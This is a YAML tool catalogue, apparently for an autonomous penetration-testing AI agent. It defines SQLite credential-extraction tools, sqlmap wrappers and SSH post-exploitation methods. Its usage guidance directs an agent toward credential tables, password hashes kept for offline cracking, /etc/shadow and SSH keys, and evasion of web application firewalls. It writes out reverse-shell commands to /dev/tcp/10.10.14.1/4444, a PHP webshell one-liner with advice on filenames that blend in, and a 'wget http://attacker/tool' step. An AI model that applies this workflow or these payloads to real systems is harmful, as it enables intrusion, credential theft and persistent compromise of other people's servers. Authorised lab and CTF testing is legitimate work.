            description: 'SQL query to execute. Any valid SQLite SQL is accepted. SELECT queries without LIMIT get an automatic
              LIMIT appended (controlled by limit param). Examples: ''SELECT * FROM users'', ''SELECT username, password FROM
              accounts WHERE active=1'', ''PRAGMA table_info("users")'', ''SELECT name, sql FROM sqlite_master''.'
          is_base64:
            type: boolean
            default: false
            description: Set to true when the database parameter contains base64-encoded file content instead of a file path.
              The server decodes it to a temp file, queries it, then cleans up.
          limit:
            type: integer
            default: 1000
            description: Maximum rows to return for SELECT queries. Auto-appended as 'LIMIT N' if the query doesn't already
              contain a LIMIT clause. Set higher for large extractions.
        returns:
          columns:
            type: array
            description: Column names from the query result
          rows:
            type: array
            description: 'Query results as array of dictionaries (column_name: value)'
          row_count:
            type: integer
            description: Number of rows returned
      list_tables:
        description: List all tables in a SQLite database with row counts for each table. Queries sqlite_master for table
          names and runs COUNT(*) on each. Provides a quick overview of database contents to guide further extraction.
        when_to_use: First step when analyzing any SQLite database — run this to see what tables exist and how many rows each
          contains before deciding what to extract. Large row counts in tables named 'users', 'accounts', 'sessions', 'logs'
          etc. indicate high-value targets for extraction.
        params:
          database:
            type: string
            required: true
            description: Path to SQLite database file, or base64-encoded content (set is_base64=true)
          is_base64:
            type: boolean
            default: false
            description: Set to true when database parameter contains base64-encoded file content
        returns:
          tables:
            type: array
            description: List of tables, each with 'name' and 'row_count' fields
          count:
            type: integer
            description: Total number of tables in the database
      describe_table:
        description: Get detailed schema of a specific table using PRAGMA table_info(). Returns each column's name, data type,
          NOT NULL constraint, default value, and whether it's a primary key. Also returns the table's row count.
        when_to_use: 'After list_tables identifies interesting tables, use this to understand column structure before querying
          or dumping. Helps identify: which columns contain credentials (password, hash, token), which columns are primary
          keys for JOINs, data types for proper querying, and nullable fields.'
        params:
          database:
            type: string
            required: true
            description: Path to SQLite database file, or base64-encoded content (set is_base64=true)
          table:
            type: string
            required: true
            description: Table name to describe (exact name as shown by list_tables)
          is_base64:
            type: boolean
            default: false
            description: Set to true when database parameter contains base64-encoded file content
        returns:
          columns:
            type: array
            description: 'Column definitions, each with: cid (column index), name, type (e.g., TEXT, INTEGER, BLOB), notnull
              (boolean), default (default value or null), pk (boolean, is primary key)'
          column_count:
            type: integer
            description: Number of columns in the table
          row_count:
            type: integer
            description: Number of rows in the table
      dump_table:
        description: Extract rows from a specific table with optional column selection. Runs 'SELECT [columns] FROM table
          LIMIT N' and returns results as dictionaries. Use the columns parameter to select only relevant columns (e.g., username
          and password) instead of dumping everything.
        when_to_use: After identifying interesting tables via list_tables or describe_table, use this to extract the actual
          data. Prefer this over query for simple full-table or column-filtered extractions since it handles quoting and limiting
          automatically. For credential tables, consider using find_credentials instead which auto-detects credential columns.
        params:
          database:
            type: string
            required: true
            description: Path to SQLite database file, or base64-encoded content (set is_base64=true)
          table:
            type: string
            required: true
            description: Table name to dump (exact name as shown by list_tables)
          columns:
            type: array
            description: Array of column names to select (e.g., ['username', 'password', 'email']). Omit to select all columns.
              Use describe_table first to see available columns.
          limit:
            type: integer
            default: 100
            description: Maximum rows to return. Default 100. Increase for full extraction of small tables, keep low for initial
              sampling of large tables.
          is_base64:
            type: boolean
            default: false
            description: Set to true when database parameter contains base64-encoded file content
        returns:
          columns:
            type: array
            description: Column names in the result set
          rows:
            type: array
            description: 'Table contents as array of dictionaries (column_name: value)'
          row_count:
            type: integer
            description: Number of rows returned (may be less than total if limited)
      find_credentials:
        description: Automatically search for credential-related data by pattern-matching table and column names. Scans table
          names against 14 patterns (user, users, account, accounts, member, members, admin, admins, login, logins, auth,
          credential, customer, employee) and column names against username patterns (username, user, login, email, name,
          account, user_name, user_id) and password patterns (password, passwd, pass, pwd, hash, secret, token, api_key, apikey,
          auth, credential). If no credential-pattern tables are found, falls back to searching ALL tables for credential-pattern
          columns. Returns extracted username/password pairs with source table.
        when_to_use: 'First thing to run on any database found during post-exploitation. Automatically identifies and extracts
          credentials without needing to know the schema. Works on: CMS databases (WordPress wp_users, Drupal users), custom
          web app databases, configuration stores, session databases. If this returns no results, fall back to list_tables
          → describe_table → dump_table for manual analysis.'
        params:
          database:
            type: string
            required: true
            description: Path to SQLite database file, or base64-encoded content (set is_base64=true)
          is_base64:
            type: boolean
            default: false
            description: Set to true when database parameter contains base64-encoded file content
          limit:
            type: integer
            default: 100
            description: Maximum rows to extract per matching table
        returns:
          credential_tables:
            type: array
            description: Table names that matched credential patterns (or all tables if no pattern matches found)
          credentials:
            type: array
            description: Extracted credential data, each with 'table' (source table name) and matched column values (e.g.,
              username, password, hash, email, token)
          count:
            type: integer
            description: Total number of credential rows extracted across all tables
      schema:
        description: Get complete database schema including all tables, their columns (name, type, constraints), row counts,
          and original CREATE TABLE SQL statements. Provides a comprehensive overview of the entire database structure in
          one call.
        when_to_use: When you want the full picture of a database in a single call rather than running list_tables followed
          by describe_table on each. Returns more detail than list_tables (includes column definitions and CREATE SQL) but
          can produce large output for databases with many tables. Prefer list_tables for initial quick look, use schema when
          you need the complete structure.
        params:
          database:
            type: string
            required: true
            description: Path to SQLite database file, or base64-encoded content (set is_base64=true)
          is_base64:
            type: boolean
            default: false
            description: Set to true when database parameter contains base64-encoded file content
        returns:
          tables:
            type: object
            description: 'Dictionary keyed by table name, each with: ''columns'' (array of {name, type, notnull, pk}), ''row_count''
              (integer), ''create_sql'' (original CREATE TABLE statement)'
          table_count:
            type: integer
            description: Total number of tables in the database
  sqlmap:
    name: sqlmap
    version: '1.10'
    description: 'Automatic SQL injection detection and exploitation tool (v1.10#stable). Supports 6 injection techniques:
      Boolean-based blind (B), Error-based (E), Union query-based (U), Stacked queries (S), Time-based blind (T), Inline queries
      (Q). Detects and exploits MySQL, PostgreSQL, Oracle, MSSQL, SQLite, DB2, MariaDB, and more. Beyond database enumeration,
      provides OS command execution (--os-cmd/--os-shell), file read/write on the target server, and password hash dumping.
      Includes 60+ WAF bypass tamper scripts. Runs non-interactively with --batch flag.'
    image: ghcr.io/silicon-works/mcp-tools-sqlmap:latest
    image_size_mb: 150
    capabilities:
    - sql_injection
    - database_enumeration
    - data_extraction
    - os_shell
    routing:
      use_for:
      - SQL injection detection and exploitation
      - test GET POST parameters for SQL injection vulnerabilities
      - enumerate databases tables columns via SQL injection
      - dump database contents through SQL injection
      - OS command execution via SQL injection
      - read files from target server via SQL injection
      - write files webshells to target via SQL injection
      - extract password hashes from database via SQL injection
      - boolean error union stacked time-based blind injection
      - WAF bypass with tamper scripts for SQL injection
      never_use_for:
      - NoSQL injection (use nosqlmap)
      - MongoDB (use mongodb or nosqlmap)
      - directory enumeration (use ffuf)
      triggers:
      - sql injection
      - sqli
      - sqlmap
      - database dump
      - union injection
      - blind injection
      prefer_over: []
    phases:
    - exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 512
      cpu: 0.5
    methods:
      test_injection:
        description: Test URL parameters for SQL injection vulnerabilities using sqlmap's detection engine. Runs with --batch
          (non-interactive) and 4 threads. Tests all 6 injection techniques by default (BEUSTQ). Parses output for vulnerability
          confirmation, injectable parameters, injection types, and detected DBMS. Sqlmap caches results in session files
          — subsequent calls to the same URL skip already-tested parameters.
        when_to_use: When you've identified a potentially injectable parameter in a web application — either from manual testing,
          web fuzzing (ffuf), or source code review. Mark the injection point with * in the URL (e.g., 'http://target/page?id=1*')
          or let sqlmap auto-detect GET parameters. For POST injection, use the data parameter. Start with level=1/risk=1
          (default), increase to level=3/risk=2 if no results, and level=5/risk=3 as last resort (risk=3 may use OR-based
          tests that can modify data). If the target uses a WAF, use tamper scripts (e.g., tamper='space2comment,randomcase')
          to bypass filtering. Use param to test a specific parameter and skip others. Use flush_session if re-testing after
          changes.
        params:
          url:
            type: string
            required: true
            description: 'Target URL with parameters. Use * to mark specific injection point (e.g., ''http://target/page?id=1*'').
              Without *, sqlmap tests all GET parameters. For REST-style URLs: ''http://target/api/users/1*/profile''.'
          data:
            type: string
            description: 'POST request body data. Switches sqlmap to POST method. Format: ''param1=value1&param2=value2''.
              Use * to mark injection point in POST data: ''username=admin&password=*''.'
          cookie:
            type: string
            description: HTTP Cookie header value (e.g., 'PHPSESSID=abc123; session=xyz'). Required for testing authenticated
              endpoints. At level >= 2, sqlmap also tests cookie values for injection.
          level:
            type: integer
            default: 1
            description: 'Test level 1-5. Level 1: tests GET/POST params. Level 2: adds Cookie testing. Level 3: adds User-Agent/Referer
              testing. Level 4-5: adds more payloads. Higher = slower but more thorough. Start with 1, increase if no results.'
          risk:
            type: integer
            default: 1
            description: 'Risk level 1-3. Risk 1: safe tests only. Risk 2: adds heavy time-based tests. Risk 3: adds OR-based
              tests (can modify/delete data — use with caution). For CTF/HTB use risk=2 freely, risk=3 on non-production targets
              only.'
          technique:
            type: string
            default: BEUSTQ
            description: SQL injection techniques to test. B=Boolean-based blind, E=Error-based, U=Union query, S=Stacked
              queries (needed for os_shell/file_write), T=Time-based blind, Q=Inline queries. Default 'BEUSTQ' tests all.
              Use 'BEU' for faster testing if you don't need stacked queries. Use 'T' alone for time-based only when other
              methods fail.
          param:
            type: string
            description: Specific parameter to test (e.g., 'id'). Without this, sqlmap tests all parameters.
          tamper:
            type: string
            description: 'Tamper script(s) for WAF bypass. Comma-separated. Common: ''space2comment'' (spaces→/**/), ''between''
              (>→BETWEEN), ''charencode'' (URL-encode), ''randomcase'' (random keyword case).'
          flush_session:
            type: boolean
            default: false
            description: Clear cached session data and re-test from scratch.
          dbms:
            type: string
            description: Force DBMS type to skip detection (e.g., 'MySQL', 'PostgreSQL', 'Microsoft SQL Server').
          proxy:
            type: string
            description: HTTP/SOCKS proxy (e.g., 'socks5://127.0.0.1:1080'). For scanning through tunnels.
          random_agent:
            type: boolean
            default: false
            description: Use random HTTP User-Agent to avoid WAF detection.
          headers:
            type: string
            description: 'Additional HTTP headers, semicolon-separated (e.g., ''Authorization: Bearer eyJ...'').'
          timeout:
            type: integer
            default: 300
            description: Process timeout in seconds (not HTTP timeout). Full level=1 testing typically takes 1-5 minutes.
              Increase to 600+ for level=3+ or slow targets.
        returns:
          vulnerable:
            type: boolean
            description: Whether SQL injection was confirmed
          injection_type:
            type: string
            description: Type of injection found (e.g., 'boolean-based blind', 'UNION query', 'time-based blind')
          dbms:
            type: string
            description: Detected DBMS (e.g., 'MySQL >= 5.0', 'PostgreSQL', 'Microsoft SQL Server 2019')
          parameters:
            type: array
            description: List of injectable parameter names
          details:
            type: array
            description: Relevant detail lines from sqlmap output (injection info, payloads, techniques)
      enumerate_dbs:
        description: 'Enumerate all databases on a confirmed vulnerable target using sqlmap''s --dbs flag. Sqlmap reuses the
          cached injection point and technique from prior test_injection calls (stored in session files), so no re-detection
          is needed. Parses the ''[*] database_name'' output lines. For MySQL: returns INFORMATION_SCHEMA plus application
          databases. For MSSQL: returns master, msdb, model, tempdb plus application databases. For PostgreSQL: returns postgres,
          template0, template1 plus application databases. For SQLite: there''s only one database (the file itself), so this
          returns a single entry.'
        when_to_use: 'Immediately after test_injection confirms SQL injection. This is the standard next step in the SQL injection
          exploitation workflow: test_injection → enumerate_dbs → dump_table. The URL must be the same one used in test_injection
          so sqlmap can reuse its cached session. System databases (information_schema, mysql, master, postgres, etc.) are
          normal — look for application databases with names like ''webapp'', ''shop'', ''blog'', ''wordpress'', ''drupal'',
          etc. that contain user data.'
        params:
          url:
            type: string
            required: true
            description: Target URL — must be the same URL used in test_injection so sqlmap reuses the cached injection session.
              If using a different URL, sqlmap will re-detect injection.
          data:
            type: string
            description: POST request body data (must match what was used in test_injection if applicable).
          cookie:
            type: string
            description: HTTP Cookie header value (must match test_injection if authentication is needed).
          dbms:
            type: string
            description: Force DBMS type to skip detection.
          proxy:
            type: string
            description: HTTP/SOCKS proxy.
          random_agent:
            type: boolean
            default: false
            description: Use random HTTP User-Agent.
          headers:
            type: string
            description: Additional HTTP headers, semicolon-separated.
          timeout:
            type: integer
            default: 300
            description: Process timeout in seconds. Database enumeration is usually fast (under 1 minute) for error-based
              and UNION injection. Time-based blind may take 2-5 minutes. Default 300s is sufficient.
        returns:
          databases:
            type: array
            description: List of database name strings (e.g., ['information_schema', 'mysql', 'webapp'])
          count:
            type: integer
            description: Number of databases found
      enumerate_tables:
        description: List all tables in a database using sqlmap's --tables flag with -D (database). Parses pipe-delimited
          table name output. Sqlmap reuses cached injection from prior test_injection calls.
        when_to_use: 'After enumerate_dbs identifies databases, use this to discover table names before dumping data. The
          workflow: test_injection → enumerate_dbs → enumerate_tables → dump_table. Look for high-value tables: ''users'',
          ''accounts'', ''credentials'', ''config'', ''sessions'', ''wp_users''.'
        params:
          url:
            type: string
            required: true
            description: Target URL — same URL used in test_injection.
          database:
            type: string
            required: true
            description: Database name from enumerate_dbs results.
          data:
            type: string
            description: POST request body data.
          cookie:
            type: string
            description: HTTP Cookie header value.
          dbms:
            type: string
            description: Force DBMS type to skip detection.
          proxy:
            type: string
            description: HTTP/SOCKS proxy.
          random_agent:
            type: boolean
            default: false
            description: Use random HTTP User-Agent.
          headers:
            type: string
            description: Additional HTTP headers, semicolon-separated.
          timeout:
            type: integer
            default: 300
            description: Process timeout in seconds.
        returns:
          tables:
            type: array
            description: List of table name strings
          count:
            type: integer
            description: Number of tables found
      dump_table:
        description: Dump contents of a specific database table using sqlmap's --dump flag with -D (database) and -T (table).
          Uses --dump-format CSV for structured output. Parses the pipe-delimited table output into column names and row dictionaries.
          Supports column selection (-C) to extract only specific fields and row limiting (--stop) to cap output. For large
          tables, use the columns and limit params to reduce data volume and extraction time.
        when_to_use: 'After enumerate_dbs identifies databases, use enumerate_tables to list tables, then dump_table to extract
          data. The workflow: enumerate_dbs → enumerate_tables → dump_table on high-value tables like ''users'', ''accounts'',
          ''credentials'', ''config'', ''sessions'', ''tokens''. Use the columns parameter to extract only credential fields
          (''username,password,email'') when you know the schema. For blind injection, each row/cell requires separate requests,
          so limiting columns and rows dramatically reduces extraction time.'
        params:
          url:
            type: string
            required: true
            description: Target URL — same URL used in test_injection.
          database:
            type: string
            required: true
            description: Database name from enumerate_dbs results (e.g., 'webapp', 'shop'). Case-sensitive on some DBMS.
          table:
            type: string
            required: true
            description: 'Table name to dump. Common targets: ''users'', ''accounts'', ''admins'', ''credentials'', ''config'',
              ''sessions'', ''wp_users'' (WordPress), ''user'' (Laravel). Case-sensitive on MySQL/PostgreSQL with Linux.'
          columns:
            type: string
            description: Comma-separated column names to extract (e.g., 'username,password,email'). Omit to dump all columns.
              Use this to reduce extraction time and output size — blind injection extraction is per-cell, so fewer columns
              = much faster.
          data:
            type: string
            description: POST request body data (must match test_injection if applicable).
          cookie:
            type: string
            description: HTTP Cookie header value.
          limit:
            type: integer
            default: 100
            description: Maximum rows to extract (maps to sqlmap --stop). Default 100. For blind injection, each row takes
              multiple requests — use 10-20 for initial sampling, then increase if needed. For UNION/error-based injection,
              extraction is fast so 100+ is fine.
          dbms:
            type: string
            description: Force DBMS type to skip detection.
          proxy:
            type: string
            description: HTTP/SOCKS proxy.
          random_agent:
            type: boolean
            default: false
            description: Use random HTTP User-Agent.
          headers:
            type: string
            description: Additional HTTP headers, semicolon-separated.
          timeout:
            type: integer
            default: 600
            description: Process timeout in seconds. UNION/error-based dumps are fast (1-2 min). Blind injection of 100 rows
              can take 5-10+ minutes. Default 600s (10 min). Increase for large blind extractions.
        returns:
          columns:
            type: array
            description: List of column name strings from the parsed table header
          rows:
            type: array
            description: 'List of row dictionaries, each mapping column name to cell value (e.g., [{''id'': ''1'', ''username'':
              ''admin'', ''password'': ''$2y$10$...''}])'
          row_count:
            type: integer
            description: Number of rows extracted
      dump_all:
        description: Dump all tables from a database at once using sqlmap's --dump-all flag with -D (database). Iterates through
          every table in the database and extracts all rows. Returns an unstructured status message (no per-table parsing).
          For blind injection, this can take a very long time — each cell in each row of each table requires separate requests.
          Timeout is 900s (15 min) by default.
        when_to_use: When you need everything from a database and have fast injection (UNION or error-based). Prefer dump_table
          for targeted extraction of specific high-value tables, which is faster and returns structured data. Use dump_all
          as a last resort or when the database is small. For blind injection, this may take 30+ minutes or even hours depending
          on data volume — in that case, use dump_table on individual tables instead. The raw_output contains all dumped data
          but the structured data field only has a status message.
        params:
          url:
            type: string
            required: true
            description: Target URL — same URL used in test_injection.
          database:
            type: string
            required: true
            description: Database name to dump entirely (from enumerate_dbs results). All tables in this database will be
              extracted.
          data:
            type: string
            description: POST request body data (must match test_injection if applicable).
          cookie:
            type: string
            description: HTTP Cookie header value.
          dbms:
            type: string
            description: Force DBMS type to skip detection.
          proxy:
            type: string
            description: HTTP/SOCKS proxy.
          random_agent:
            type: boolean
            default: false
            description: Use random HTTP User-Agent.
          headers:
            type: string
            description: Additional HTTP headers, semicolon-separated.
          timeout:
            type: integer
            default: 900
            description: Process timeout in seconds. Default 900s (15 min). UNION/error-based dumps of small databases may
              complete in 2-5 minutes. Large databases or blind injection will need more time — increase to 1800+ or use dump_table
              instead.
        returns:
          database:
            type: string
            description: Name of the database that was dumped
          message:
            type: string
            description: Status message ('Database dump completed'). Actual table data is in raw_output, not structured here.
      dump_passwords:
        description: 'Dump database user password hashes using sqlmap''s --passwords flag. Extracts DBMS user accounts and
          their password hashes. For MySQL: extracts from mysql.user. For MSSQL: extracts from master.sys.sql_logins. For
          PostgreSQL: extracts from pg_shadow.'
        when_to_use: After confirming SQL injection, use this to extract database user password hashes for offline cracking
          with john or hashcat. Useful when you need database credentials for direct DB access or to find reused passwords.
          The hashes can be cracked with john's identify and crack methods.
        params:
          url:
            type: string
            required: true
            description: Target URL — same URL used in test_injection.
          data:
            type: string
            description: POST request body data.
          cookie:
            type: string
            description: HTTP Cookie header value.
          dbms:
            type: string
            description: Force DBMS type to skip detection.
          proxy:
            type: string
            description: HTTP/SOCKS proxy.
          random_agent:
            type: boolean
            default: false
            description: Use random HTTP User-Agent.
          headers:
            type: string
            description: Additional HTTP headers, semicolon-separated.
          timeout:
            type: integer
            default: 300
            description: Process timeout in seconds.
        returns:
          hashes:
            type: array
            description: List of {user, hash} objects with DBMS username and password hash
          count:
            type: integer
            description: Number of hashes extracted
      os_shell:
        description: 'Execute an OS command on the target server via SQL injection using sqlmap''s --os-cmd flag. The mechanism
          depends on the DBMS: MySQL uses User Defined Functions (UDF, requires FILE privilege and writable plugin directory),
          MSSQL uses xp_cmdshell (must be enabled or enableable via stacked queries), PostgreSQL uses COPY TO/FROM with large
          objects or PL/Python. Parses the ''command standard output'' section from sqlmap''s output. This is a single-command
          execution, not a persistent shell — each call is independent.'
        when_to_use: 'When you need Remote Code Execution (RCE) through a confirmed SQL injection and the goal is to escalate
          from database access to OS access. This is a major privilege escalation step. Requirements: (1) stacked queries
          injection type or specific DBMS features, (2) sufficient database privileges (MySQL: FILE, MSSQL: sysadmin or xp_cmdshell
          access, PostgreSQL: superuser). If test_injection found only Boolean/UNION injection (no stacked queries ''S''),
          this may not work on MySQL — but MSSQL xp_cmdshell works with any injection type if the user has permissions. Common
          first commands: ''id'', ''whoami'', ''hostname'', ''cat /etc/passwd'', ''dir C:\Users''. For a reverse shell, execute
          a shell payload (e.g., ''bash -c "bash -i >& /dev/tcp/LHOST/PORT 0>&1"'').'
        params:
          url:
            type: string
            required: true
            description: Target URL — same URL used in test_injection.
          command:
            type: string
            required: true
            description: 'OS command to execute on the target server. Examples: ''id'' (Linux user), ''whoami'' (current user),
              ''cat /etc/passwd'' (user list), ''dir C:\Users'' (Windows users), ''netstat -tlnp'' (listening ports). For
              reverse shell: ''bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"''. Commands with special characters may
              need quoting.'
          data:
            type: string
            description: POST request body data (must match test_injection if applicable).
          cookie:
            type: string
            description: HTTP Cookie header value.
          dbms:
            type: string
            description: Force DBMS type to skip detection.
          proxy:
            type: string
            description: HTTP/SOCKS proxy.
          timeout:
            type: integer
            default: 120
            description: Process timeout in seconds. OS command execution typically completes in 10-30 seconds. Default 120s
              allows for slow initial UDF upload or xp_cmdshell re-enable. Increase if the command itself is long-running.
        returns:
          command:
            type: string
            description: The command that was executed
          output:
            type: string
            description: Command stdout as captured by sqlmap. May be empty if the DBMS doesn't return output (some UDF methods
              are blind — output not captured).
      file_read:
        description: 'Read a file from the target server''s filesystem via SQL injection using sqlmap''s --file-read flag.
          The mechanism depends on the DBMS: MySQL uses LOAD_FILE() (requires FILE privilege), PostgreSQL uses pg_read_file()
          or COPY FROM with large objects, MSSQL uses OPENROWSET(BULK) or xp_cmdshell. Sqlmap downloads the file to a local
          temp path, then the MCP server reads and returns its contents. Binary files will be saved but may not display correctly
          as text.'
        when_to_use: 'When you need to read files from the target server through SQL injection — without needing OS shell
          access. Common targets: ''/etc/passwd'' (user enumeration), ''/etc/shadow'' (password hashes, requires root DB user),
          web application config files (database credentials, API keys), source code. For MySQL: common config paths are ''/var/www/html/wp-config.php''
          (WordPress), ''/var/www/html/config.php'', ''/var/www/html/.env''. For MSSQL: ''C:\inetpub\wwwroot\web.config''.
          Requires database FILE privilege on MySQL. If file_read returns empty content, the DB user may lack permissions
          — try os_shell instead if stacked queries are available.'
        params:
          url:
            type: string
            required: true
            description: Target URL — same URL used in test_injection.
          file_path:
            type: string
            required: true
            description: 'Absolute path to the file on the target server. Linux: ''/etc/passwd'', ''/var/www/html/config.php'',
              ''/home/user/.ssh/id_rsa''. Windows: ''C:\inetpub\wwwroot\web.config'', ''C:\Windows\System32\drivers\etc\hosts''.
              Must be readable by the database process user.'
          data:
            type: string
            description: POST request body data (must match test_injection if applicable).
          cookie:
            type: string
            description: HTTP Cookie header value.
          dbms:
            type: string
            description: Force DBMS type to skip detection.
          proxy:
            type: string
            description: HTTP/SOCKS proxy.
          timeout:
            type: integer
            default: 120
            description: Process timeout in seconds. File reads are typically fast (10-30 seconds). Large files may take longer
              with blind injection. Default 120s is sufficient for most files.
        returns:
          file_path:
            type: string
            description: The path of the file that was read
          content:
            type: string
            description: File contents as text. Empty string if the read failed (insufficient privileges or file doesn't exist).
              Binary files may contain non-printable characters.
      file_write:
        description: 'Write a file to the target server''s filesystem via SQL injection using sqlmap''s --file-write and --file-dest
          flags. The mechanism depends on the DBMS: MySQL uses SELECT INTO OUTFILE (requires FILE privilege and writable directory
          — secure_file_priv must allow the dest path), MSSQL uses xp_cmdshell or sp_OACreate, PostgreSQL uses COPY TO or
          large objects. The local_file parameter accepts either a file path or raw content — if the value is not a valid
          local path, the MCP server writes it to a temp file first, then passes it to sqlmap.'
        when_to_use: 'When you need to upload files to the target server through SQL injection — the primary use case is webshell
          upload for persistent code execution. Common scenario: write a PHP webshell to the web root (e.g., ''/var/www/html/shell.php'')
          to get command execution without needing stacked queries. Requirements: (1) database FILE privilege (MySQL) or equivalent,
          (2) writable destination directory, (3) known web root path. If you don''t know the web root, use file_read on common
          paths first (''/etc/apache2/sites-enabled/000-default.conf'', ''/etc/nginx/sites-enabled/default'') or check web
          server error pages. For MySQL, secure_file_priv may restrict writable directories — check with ''SELECT @@secure_file_priv''.
          Simpler alternative for RCE: use os_shell if stacked queries are available.'
        params:
          url:
            type: string
            required: true
            description: Target URL — same URL used in test_injection.
          local_file:
            type: string
            required: true
            description: 'Either a local file path to upload, or raw file content as a string. If the value is not a valid
              local file path, it''s treated as content and written to a temp file. For a PHP webshell: ''<?php system($_GET["cmd"]);
              ?>''. For an ASPX webshell or binary payload, provide a local file path.'
          remote_path:
            type: string
            required: true
            description: 'Absolute destination path on the target server. Must be writable by the database process. Common
              web roots: ''/var/www/html/'' (Apache/Debian), ''/var/www/'' (Ubuntu), ''/usr/share/nginx/html/'' (Nginx), ''C:\inetpub\wwwroot\''
              (IIS). Use a filename that blends in: ''info.php'', ''test.php'', ''.config.php''.'
          data:
            type: string
            description: POST request body data (must match test_injection if applicable).
          cookie:
            type: string
            description: HTTP Cookie header value.
          dbms:
            type: string
            description: Force DBMS type to skip detection.
          proxy:
            type: string
            description: HTTP/SOCKS proxy.
          timeout:
            type: integer
            default: 120
            description: Process timeout in seconds. File writes are typically fast (10-30 seconds). Default 120s is sufficient.
        returns:
          remote_path:
            type: string
            description: The destination path where the file was written
          written:
            type: boolean
            description: Whether the write succeeded (parsed from sqlmap's 'file has been successfully written' message).
              False if the write failed due to permissions, path restrictions, or unsupported DBMS method.
  ssh:
    name: ssh
    version: '1.0'
    description: 'SSH client (OpenSSH 10.2p1 + sshpass 1.10) for remote command execution, file transfer, and script deployment
      on compromised hosts. 7 methods: exec (single command with retry), shell (sequential commands joined with &&), copy_from/copy_to
      (SCP text file transfer), upload_binary (base64 chunked binary upload), run_script (upload+execute+cleanup), and background
      (nohup/disown detached process with env var injection). Supports password auth (via sshpass), PEM private keys, and
      OpenSSH-format keys (auto-converted to PEM). Auto-retry on transient failures (timeout, connection reset) with exponential
      backoff. Classified error messages for connection refused, permission denied, timeout, no route. Accepts arbitrary ssh_options
      for legacy ciphers, KEX algorithms, and MTU workarounds.'
    image: ghcr.io/silicon-works/mcp-tools-ssh:latest
    image_size_mb: 100
    capabilities:
    - remote_shell_access
    - command_execution
    - file_transfer
    - credential_based_access
    phases:
    - exploitation
    - post-exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 128
      cpu: 0.25
    routing:
      use_for:
      - execute commands on a compromised host via SSH
      - upload exploits or tools to target via SCP
      - download files from compromised target via SCP
      - run enumeration scripts on remote host via SSH
      - SSH access with discovered credentials or private keys
      - start persistent background process on target
      - upload compiled binary exploit to target
      - environment variable injection for privilege escalation via SSH
      never_use_for:
      - SSH brute-force (use hydra)
      - port scanning
      - initial SSH connection test
      triggers:
      - SSH
      - SCP
      - remote command
      - remote shell
      - ssh exec
      - ssh key
      - upload to target
      - download from target
    methods:
      exec:
        description: Execute a single command on a remote host via SSH. Uses sshpass for password auth or temp key file for
          key auth. OpenSSH-format keys are auto-converted to PEM via ssh-keygen. Includes automatic retry (up to 2 retries)
          on transient failures (connection timeout, reset, network unreachable) with exponential backoff. SSH warnings (host
          key, 'Permanently added') are filtered from stderr. Returns classified error messages on failure (connection refused,
          permission denied, timeout, no route to host).
        when_to_use: 'The primary method for running commands on a host after gaining SSH credentials. Use for: (1) Post-exploitation
          enumeration — run ''id'', ''whoami'', ''uname -a'', ''cat /etc/passwd'', (2) Checking sudo permissions — ''sudo
          -l'', (3) Searching for flags or sensitive files — ''find / -name user.txt 2>/dev/null'', (4) Running single recon
          commands before uploading full scripts. For multiple sequential commands, use shell instead. For multi-line scripts,
          use run_script. For persistent processes, use background.'
        params:
          host:
            type: string
            required: true
            description: Target hostname or IP address.
          username:
            type: string
            required: true
            description: SSH username (e.g., 'root', 'www-data', discovered user).
          password:
            type: string
            description: SSH password. Uses sshpass for non-interactive password auth. Provide either password or key, not
              both.
          key:
            type: string
            description: Private key content as string (PEM or OpenSSH format). OpenSSH keys ('BEGIN OPENSSH PRIVATE KEY')
              are auto-converted to PEM format. Written to temp file with 0600 permissions, deleted after use.
          command:
            type: string
            required: true
            description: Shell command to execute on the remote host.
          port:
            type: integer
            default: 22
            description: SSH port. Change for non-standard SSH ports discovered by nmap.
          timeout:
            type: integer
            default: 30
            description: Total timeout in seconds for connection + command execution. Increase for slow commands or high-latency
              targets.
          ssh_options:
            type: string
            description: 'Additional SSH options as a single string, parsed via shlex. Examples: ''-o KexAlgorithms=diffie-hellman-group14-sha256''
              for legacy servers, ''-o Ciphers=aes256-cbc'' for old SSH versions, ''-o StrictHostKeyChecking=no'' (already
              set by default).'
        returns:
          exit_code:
            type: integer
            description: Command exit code (0=success, non-zero=failure, 255=SSH connection error).
          stdout:
            type: string
            description: Command standard output.
          stderr:
            type: string
            description: Command standard error (SSH warnings filtered out).
      shell:
        description: Execute multiple commands in sequence on a remote host. Commands are joined with '&&' (each command must
          succeed for the next to run) and sent as a single SSH exec. Uses the same retry and error handling as exec. Returns
          combined stdout from all commands.
        when_to_use: 'When you need to run several related commands in order, such as: (1) Post-exploitation info gathering
          — [''id'', ''whoami'', ''cat /etc/os-release'', ''uname -a''], (2) File system exploration — [''ls -la /home'',
          ''ls -la /var/www'', ''ls -la /opt''], (3) Setup steps — [''mkdir -p /tmp/.work'', ''cd /tmp/.work'', ''wget http://attacker/tool''].
          Commands are joined with &&, so if any command fails the chain stops. For independent commands that should all run
          regardless, use exec with '';'' separator instead.'
        params:
          host:
            type: string
            required: true
            description: Target hostname or IP address.
          username:
            type: string
            required: true
            description: SSH username.
          password:
            type: string
            description: SSH password.
          key:
            type: string
            description: Private key content (PEM or OpenSSH format, auto-converted).
          commands:
            type: array
            required: true
            description: List of commands to execute in order. Joined with '&&' — chain stops on first failure.
          port:
            type: integer
            default: 22
            description: SSH port.
          timeout:
            type: integer
            default: 60
            description: Total timeout for the entire command chain.
          ssh_options:
            type: string
            description: Additional SSH options string.
        returns:
          exit_code:
            type: integer
            description: Exit code of the last executed command in the chain.
          stdout:
            type: string
            description: Combined stdout from all commands.
      copy_from:
        description: Download a text file from a remote host via SCP. Transfers the file to a local temp file, reads the content
          as text (with error replacement for binary bytes), and returns the content as a string. For binary files, use exec
          with 'base64 <file>' and decode locally instead.
        when_to_use: 'To retrieve text files from a compromised target: (1) Configuration files — /etc/passwd, /etc/shadow,
          ssh keys from ~/.ssh/, (2) Application configs — database credentials, .env files, wp-config.php, (3) Flags — user.txt,
          root.txt, (4) Log files — /var/log/auth.log, application logs, (5) Source code for analysis. Returns file content
          as a string. Not suitable for large binary files — use exec with base64 encoding for those.'
        params:
          host:
            type: string
            required: true
            description: Target hostname or IP address.
          username:
            type: string
            required: true
            description: SSH username.
          password:
            type: string
            description: SSH password.
          key:
            type: string
            description: Private key content (PEM or OpenSSH format, auto-converted).
          remote_path:
            type: string
            required: true
            description: Absolute path to the file on the remote host (e.g., '/etc/shadow', '/home/user/user.txt').
          port:
            type: integer
            default: 22
            description: SSH port.
